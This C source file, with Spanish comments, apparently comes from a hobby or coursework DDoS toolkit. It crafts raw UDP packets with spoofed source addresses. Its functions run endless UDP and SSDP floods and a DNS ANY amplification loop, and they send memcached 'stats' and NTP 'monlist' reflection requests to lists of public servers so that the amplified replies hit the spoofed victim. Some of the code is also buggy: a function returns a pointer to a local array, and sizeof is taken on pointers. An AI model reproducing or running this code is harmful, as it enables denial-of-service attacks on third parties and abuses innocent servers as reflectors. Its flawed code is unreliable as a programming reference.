#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>	//tcp header
#include <netinet/udp.h>	// udp header
#include <netinet/ip.h>	// ip_header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include "./includes/checksum.h"
#include "./includes/udp.h"
#include "./includes/tcp.h"

extern pthread_mutex_t lock;

#define DATAGRAM_LEN 4096

//Funcion que genera ip de los parametros dados
ipArray* generador_ip(char* ip_addr, char* subnet_mask){
	struct in_addr addr;
    struct in_addr mask;
    struct in_addr net_addr;
    struct in_addr broadcast_addr;
    uint32_t num_addrs;

	//Calculamos la cantidad de ips con la mascara proporcionada

    inet_pton(AF_INET, ip_addr, &addr);
    inet_pton(AF_INET, subnet_mask, &mask);

    net_addr.s_addr = addr.s_addr & mask.s_addr;
    broadcast_addr.s_addr = net_addr.s_addr | ~mask.s_addr;

    num_addrs = ntohl(broadcast_addr.s_addr) - ntohl(net_addr.s_addr) + 1;
	ipArray arrayIPS[num_addrs];
	uint32_t k;
	int cont = 0;
	// Iteramos por las ips calculadas con la mascara
    for(k = 0; k < num_addrs; k++){
		// Creamos las estructuras in_addr de las ips
        struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(net_addr.s_addr) + k;
        struct in_addr aux;
        aux.s_addr = htonl(curr_addr.s_addr);
        char *addr_src = inet_ntoa(aux);
		strcpy(arrayIPS[k].ip, addr_src);
		cont++;
        /*struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(args->net_addr.s_addr) + i;*/
	}
	return arrayIPS;
}

// Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len, char* mensaje){

    char *data , *pseudogram;

    char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

    //IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct iphdr));
	struct pseudo_header psh;

	//Payload
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	memcpy(data , mensaje, sizeof(mensaje));
	
	// IP header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof (struct udphdr) + sizeof(data); //Tamaño de todo el paquete
	iph->id = htonl(rand() % 78123);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
    // header udp
	udph->source = src->sin_port;
	udph->dest = dst->sin_port;
	udph->len = htons(sizeof(struct udphdr) + sizeof(data));
	udph->check = 0;
	
	//UDP checksum
	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.prt_length = htons(sizeof(struct udphdr) + sizeof(data));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(data));
	
	udph->check = csum( (unsigned short*) pseudogram , psize);

    *datagram_ret = datagram;
	*datagram_len = iph->tot_len;
	free(pseudogram);
}

void udp(int sockfd, char* destino, char* addr_src, int puerto){
	// direccion IP de destino
	struct sockaddr_in daddr;
	if(host_addr(&daddr, destino, puerto) == 1){
		perror("Error al crear la configuracion IP");
		exit(1);
	}

	// direccion IP de origen
	struct sockaddr_in saddr;
	if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
		perror("Error al crear la configuracion IP");
		exit(1);
	}

	// Creamos el paquete udp que vamos a enviar
	char* datagram;
	int datagram_len;
	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "Paquete custom");
	
	// Enviamos el paquete UDP al destino
	if(sendto(sockfd, datagram, datagram_len , 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
	{
		perror("No se ha podido enviar el paquete UDP");
	} else {
		printf ("Paquete UDP enviado a %s. Tamaño : %d \n", destino, datagram_len);
	}
}

void udp_flood(int sock, char* src, char* dst, int puerto, char* mensaje){
	while(1){
		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, dst, puerto) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&saddr, src, (rand() % 65535)) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		char* datagram;
		int datagram_len;

		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, mensaje);
		if (sendto(sock, datagram, datagram_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0) {
            perror("Error al enviar el paquete UDP");
            exit(1);
        } else {
			printf ("Paquete UDP enviado a %s. Tamaño : %d \n", dst, datagram_len);
		}
	}
}


// https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md
void ssdp(int sockfd, char* addr_src) {

	// direccion IP de destino
	struct sockaddr_in daddr;
	if(host_addr(&daddr, "239.255.255.250", 1900) == 1){
		perror("Error al crear la configuracion IP");
		exit(1);
	}

	// direccion IP de origen
	struct sockaddr_in saddr;
	if(host_addr(&saddr, addr_src, (rand() % 65535)) == 1){
		perror("Error al crear la configuracion IP");
		exit(1);
	}

	char* m_search = "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:5\r\n\r\n";

	char* datagram;
	int datagram_len;
	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, m_search);
    
    // Enviar los paquetes SSDP
    while(1) {
        if (sendto(sockfd, datagram, datagram_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0) {
            perror("No se ha podido enviar el paquete SSDP");
            exit(1);
        } else {
			printf ("Paquete SSDP enviado a 239.255.255.250. Tamaño : %d \n" , datagram_len);
		}
    }
}

// Funcion que crea un paquete UDP con un query DNS con el flag ANY de www.google.com
void udp_dns(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len){

	char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

	char* paquete_DNS = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

	// Set up the DNS header
	dns_header* dns = (dns_header*)paquete_DNS;
	dns->id = htons(0x1234);        // Identificador
	dns->rd = 1;                    // Recursion
	dns->qdcount = htons(1);        // 1 consulta

	// Preparar la pregunta dns
	char* qname = paquete_DNS + sizeof(dns_header);
	strcpy(qname, "\x03""www\x06""google\x03""com");   // Nombre del dominio a consultar

	dns_question* question = (dns_question*)(qname + strlen(qname) + 1);
	question->qtype = htons(255);    // Consulta ANY
	question->qclass = htons(1);     // Clase de la consulta IN

	// header UDP
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct iphdr));
	udph->source = src->sin_port;
	udph->dest = dst->sin_port;
	udph->len = htons(sizeof(struct udphdr) + sizeof(dns_header) + strlen(qname) + 1 + sizeof(dns_question));
	udph->check = 0;

    // header IP
	struct iphdr *iph = (struct iphdr *) datagram;
	
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen(qname) + 1 + sizeof(dns_question));
	iph->id = htonl(rand() % 78123);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, ntohs(iph->tot_len));

    *datagram_ret = datagram;
	*datagram_len = iph->tot_len;
}

void memcached(int sockfd, char* addr_src){
	// Leemos las ips de servidores memcached del archivo descargado de https://github.com/SecOps-Institute/memcached-server-iplist
	FILE* mem_servers = fopen("./listas/memcached-servers.txt", "r");
	if (mem_servers == NULL) {
		perror("Error al abrir el archivo");
		exit(1);
	}

	char linea[256];
	while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

		// Quitamos el salto de linea de las ips de la lista
		size_t len = strlen(linea);
		if (len > 0 && linea[len - 1] == '\n') {
			linea[len - 1] = '\0';
		}

		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, linea, 11211) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&saddr, addr_src, (rand() % 65535)) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		char* stats = "stats\r\n";

		// Creamos un datagrama udp con el comando stats para que el servidor responda con
		// estadisticas suyas al origen del paquete
		char* datagram;
		int datagram_len;
		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, stats);
		
		if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
		{
			perror("No se ha podido enviar el paquete MEMCACHE");
		} else {
			printf ("Paquete MEMCACHE enviado a %s. Tamaño : %d \n", linea, datagram_len);
		}
	}

	fclose(mem_servers);
}

void ntp_amp(int sock, char* addr_src){
	// Leemos las ips de servidores ntp
	FILE* mem_servers = fopen("./listas/ntp-servers.txt", "r");
	if (mem_servers == NULL) {
		printf("Error al abrir el archivo.\n");
		exit(1);
	}

	char linea[256];
	while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

		// Quitamos el salto de linea de las ips de la lista
		size_t len = strlen(linea);
		if (len > 0 && linea[len - 1] == '\n') {
			linea[len - 1] = '\0';
		}

		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, linea, 123) == 1){
			perror("Error al crear la configuracion IP");
            exit(1);
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&saddr, addr_src, (rand() % 65535)) == 1){
			perror("Error al crear la configuracion IP");
            exit(1);
		}

		// Comando monlist: devuelve el monitoreo de los datos del servidor ntp
		char ntp[8];
		ntp[0] = 0x17;
		ntp[1] = 0x00;
		ntp[2] = 0x03;
		ntp[3] = 0x2A;
		ntp[4] = 0x00;
		ntp[5] = 0x00;
		ntp[6] = 0x00;
		ntp[7] = 0x00;

		// Creamos datagrama udp con el comando monlist
		char* datagram;
		int datagram_len;
		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp);
		
		if(sendto (sock, datagram, datagram_len , 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
		{
			perror("No se ha podido enviar el paquete NTP");
		} else {
			printf ("Paquete NTP enviado a %s. Tamaño : %d \n", linea, datagram_len);
		}
	}

	fclose(mem_servers);
}

void dns_amp(int sockfd, char* destino, char* addr_src, int puerto){
	while(1){
		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, destino, puerto) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&saddr, addr_src, (rand() % 65535)) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		// Creamos datagrama udp con el tipo de pregunta ANY
		char* datagram;
		int datagram_len;

		udp_dns(&saddr, &daddr, &datagram, &datagram_len);

		if(sendto (sockfd, datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen("\x03""www\x06""google\x03""com") + 1 + sizeof(dns_question), 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
		{
			perror("No se ha podido enviar el paquete DNS");
		} else {
			printf ("Paquete DNS enviado a %s. Tamaño : %d \n" , destino, ntohs(datagram_len));
		}
	}
}